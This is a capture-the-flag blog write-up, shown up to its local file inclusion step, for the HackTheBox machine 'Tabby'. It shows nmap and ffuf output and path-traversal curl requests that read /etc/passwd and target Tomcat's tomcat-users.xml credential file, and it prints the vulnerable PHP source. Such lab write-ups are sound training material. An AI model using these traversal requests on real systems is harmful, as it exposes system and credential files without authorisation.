<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Tabby | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Tabby HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/tabby/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/tabby/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Tabby "><meta property="og:description" content="Tabby HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/tabby/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-07T17:30:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png"><meta name=twitter:title content="Tabby "><meta name=twitter:description content="Tabby HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Tabby ","item":"https://s4ch.github.io/writeups/hackthebox/tabby/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tabby ","name":"Tabby ","description":"Tabby HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Tabby Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 $ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip Network enumeration Port and service discovery scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # Nmap 7.80 scan initiated Sat Aug 8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194 Increasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase. Nmap scan report for 10.10.10.194 Host is up (0.032s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds HTTP enumeration Let’s start with the website on port 80 and do a bunch of directory busting with ffuf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ ffuf -u http://10.10.10.194/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.194/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ index.php [Status: 200, Size: 14175, Words: 2135, Lines: 374] news.php [Status: 200, Size: 0, Words: 1, Lines: 1] . [Status: 200, Size: 14175, Words: 2135, Lines: 374] :: Progress: [153068/153068] :: Job [1/1] :: 773 req/sec :: Duration: [0:03:18] :: Errors: 0 :: Let’s try to do something with news.php.\nIf we check the menu on the main page, we can see that NEWS have the following link: http://megahosting.htb/news.php?file=statement\nLet’s add the local domain entries:\n1 2 3 $ cat /etc/hosts| grep 194 10.10.10.194 tabby.htb 10.10.10.194 megahosting.htb The link does look like LFI vulnerable.\nHTTP exploitation: LFI Let’s confirm the LFI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 $ curl http://megahosting.htb/news.php\\?file\\=../../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash We can also read the source code of this page: http://megahosting.htb/news.php?file=../news.php\n1 2 3 4 5 6 7 8 \u003c?php $file = $_GET['file']; $fh = fopen(\"files/$file\",\"r\"); while ($line = fgets($fh)) { echo($line); } fclose($fh); ?\u003e Let’s try to access the tomcat manager of the Tomcat server on prot 8080: http://10.10.10.194:8080/manager/html\nNo luck with default credentials, but since we have a LFI we may try to read the configuration file.\nLet’s check on which OS we are before.\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ curl 'http://megahosting.htb/news.php?file=../../../../../../../etc/os-release' NAME=\"Ubuntu\" VERSION=\"20.04 LTS (Focal Fossa)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 20.04 LTS\" VERSION_ID=\"20.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=focal UBUNTU_CODENAME=focal If we search the tomcat package for Ubuntu focal (20.04) we find it’s in version 9.\nPS: http://megahosting.htb:8080/ also discloses the tomcat version.\nThe config file storing the manager credentials is $CATALINA_HOME/conf/tomcat-users.xml.\nOn Ubuntu $CATALINA_HOME = /usr/share/tomcat{x} where {x} is the version of tomcat eg. 7, 8, 9, etc. Also the config folder is /etc/tomcat{x}.\nBut /etc/tomcat{x} may be for older versions only.\nLet’s check the files list for tomcat9 for ubuntu: https://packages.ubuntu.com/focal/all/tomcat9/filelist\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /etc/cron.daily/tomcat9 /etc/rsyslog.d/tomcat9.conf /etc/tomcat9/policy.d/01system.policy /etc/tomcat9/policy.d/02debian.policy /etc/tomcat9/policy.d/03catalina.policy /etc/tomcat9/policy.d/04webapps.policy /etc/tomcat9/policy.d/50local.policy /lib/systemd/system/tomcat9.service /usr/lib/sysusers.d/tomcat9.conf /usr/lib/tmpfiles.d/tomcat9.conf /usr/libexec/tomcat9/tomcat-start.sh /usr/libexec/tomcat9/tomcat-update-policy.sh /usr/share/doc/tomcat9/README.Debian /usr/share/doc/tomcat9/changelog.Debian.gz /usr/share/doc/tomcat9/copyright /usr/share/tomcat9-root/default_root/META-INF/context.xml /usr/share/tomcat9-root/default_root/index.html /usr/share/tomcat9/default.template /usr/share/tomcat9/etc/catalina.properties /usr/share/tomcat9/etc/context.xml /usr/share/tomcat9/etc/jaspic-providers.xml /usr/share/tomcat9/etc/logging.properties /usr/share/tomcat9/etc/server.xml /usr/share/tomcat9/etc/tomcat-users.xml /usr/share/tomcat9/etc/web.xml /usr/share/tomcat9/logrotate.template /var/lib/tomcat9/conf /var/lib/tomcat9/logs /var/lib/tomcat9/work So it’s seems ubuntu mapped the files differently than the apache defaults, so it won’t be $TOMCAT_HOME/conf/tomcat-users.xml but $TOMCAT_HOME/etc/tomcat-users.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 $ curl 'http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml' \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ","wordCount":"1980","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png","datePublished":"2020-11-07T17:30:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/tabby/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Tabby</h1><div class=post-description>Tabby HackTheBox writeup</div><div class=post-meta><span title='2020-11-07 17:30:00 +0000 UTC'>November 7, 2020</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;1980 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png alt="Tabby HackTheBox Machine"><p>Tabby - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation-lfi>HTTP exploitation: LFI</a></li><li><a href=#http-exploitation-file-upload--rce>HTTP exploitation: File upload & RCE</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation-of-machine--tomcat-to-ash>Privilege Escalation of Machine : tomcat to ash</a></li><li><a href=#privilege-escalation-of-machine--ash-to-root>Privilege Escalation of Machine : ash to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Tabby</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/259>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service discovery scan with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Sat Aug  8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194
</span></span><span class=line><span class=cl>Increasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase.
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.194
</span></span><span class=line><span class=cl>Host is up (0.032s latency).
</span></span><span class=line><span class=cl>Not shown: 65531 closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Mega Hosting
</span></span><span class=line><span class=cl>8080/tcp open  http    Apache Tomcat
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: OPTIONS GET HEAD POST
</span></span><span class=line><span class=cl>|_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl>|_http-title: Apache Tomcat
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Sat Aug  8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>Let&rsquo;s start with the website on port 80 and do a bunch of directory busting
with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.194</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>html</span><span class=p>,</span><span class=o>.</span><span class=n>php</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.194</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>html</span> <span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>php</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>14175</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>2135</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>374</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=o>.</span><span class=n>php</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>14175</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>2135</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>374</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>153068</span><span class=o>/</span><span class=mi>153068</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>773</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>18</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to do something with <code>news.php</code>.</p><p>If we check the menu on the main page, we can see that <code>NEWS</code> have the following
link: <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a></p><p>Let&rsquo;s add the local domain entries:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts| grep 194
</span></span><span class=line><span class=cl>10.10.10.194 tabby.htb
</span></span><span class=line><span class=cl>10.10.10.194 megahosting.htb
</span></span></code></pre></td></tr></table></div></div><p>The link does look like LFI vulnerable.</p><h2 id=http-exploitation-lfi>HTTP exploitation: LFI<a hidden class=anchor aria-hidden=true href=#http-exploitation-lfi>#</a></h2><p>Let&rsquo;s confirm the LFI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
